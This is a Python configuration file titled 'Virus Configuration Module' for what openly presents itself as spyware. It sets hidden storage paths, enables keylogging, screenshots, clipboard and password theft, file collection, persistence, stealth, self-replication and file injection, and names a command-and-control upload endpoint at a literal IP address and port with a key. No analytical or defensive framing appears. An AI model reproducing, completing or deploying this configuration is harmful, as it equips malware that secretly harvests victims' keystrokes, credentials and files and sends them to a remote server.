"""
Virus Configuration Module
"""
import os

# Logging Configuration
LOG_FILE = "keyboard_log.txt"  # Merged log file (keyboard + all activity)
ACTIVITY_LOG_FILE = "activity_log.txt"  # DEPRECATED: Now merged into keyboard_log.txt
SCREENSHOT_DIR = "screenshots"
DATA_DIR = ".system_cache"
ENCRYPTED_DATA_FILE = ".system_cache/encrypted_data.bin"
EXFILTRATION_FILE = ".system_cache/pending_upload.json"
VIRUS_PID_FILE = ".system_cache/virus.pid"

# Feature Flags
SYSTEM_WIDE_LOGGING = True
ENABLE_CLIPBOARD_MONITORING = True
ENABLE_SCREENSHOTS = True
ENABLE_MOUSE_TRACKING = True
ENABLE_DATA_EXFILTRATION = True
ENABLE_PERSISTENCE = True
ENABLE_STEALTH = True
ENABLE_PASSWORD_COLLECTION = True
ENABLE_FILE_COLLECTION = True
ENABLE_SELF_REPLICATION = True
ENABLE_FILE_INJECTION = True

# Timing Configuration
SCREENSHOT_INTERVAL = 30
CLIPBOARD_CHECK_INTERVAL = 1
EXFILTRATION_INTERVAL = 60  # Every 1 minute
DATA_COLLECTION_INTERVAL = 3600  # Every hour
FILE_INJECTION_INTERVAL = 300  # Every 5 minutes

# C2 Server Configuration
C2_SERVER = "http://103.75.183.125:8080/api/collect"
C2_KEY = "default_key_change_me"

# Auto-close when exploitation complete
AUTO_CLOSE_AFTER_COLLECTION = False  # Set to False to keep virus running after collection
COLLECTION_TIMEOUT = 300  # 5 minutes max for initial collection

